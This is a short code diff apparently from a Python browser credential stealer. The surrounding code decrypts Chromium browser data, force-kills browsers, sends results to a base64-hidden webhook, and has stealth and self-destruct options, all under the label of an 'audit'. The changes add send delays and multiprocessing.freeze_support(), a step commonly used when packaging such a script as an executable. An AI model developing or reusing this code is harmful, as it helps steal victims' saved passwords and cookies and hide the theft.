@@ -13,6 +13,8 @@ import ctypes
 import logging
 import argparse
 import requests
+import time
+import multiprocessing
 from pathlib import Path
 from datetime import datetime
 
@@ -27,8 +29,8 @@ CONFIG = {
     "ds_webhook": "",  
     "stealth":    False,
     "output_dir": ".audit",
-    "delay":           0,
-    "send_delay":      0,
+    "delay":      1,
+    "send_delay": 2,
     "webhook_timeout": 15,
     "self_destruct":   False
 }
@@ -346,7 +348,6 @@ class ChromiumDecryptor:
         if not data and not filtered and auto_kill:
             log("No se detectaron datos. Reintentando con cierre forzado de navegadores...", "warning")
             self.kill_browsers()
-            import time
             time.sleep(1.5)
             # Llamada recursiva con auto_kill=False para evitar bucles infinitos
             return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)
@@ -419,7 +420,6 @@ def main():
         return
     
     if args.delay > 0:
-        import time
         time.sleep(args.delay)
     
     ds_w = args.webhook or safe_b64_decode(CONFIG["ds_webhook"])
@@ -447,4 +447,5 @@ def main():
             exf.self_destruct()
 
 if __name__ == "__main__":
+    multiprocessing.freeze_support()
     main()
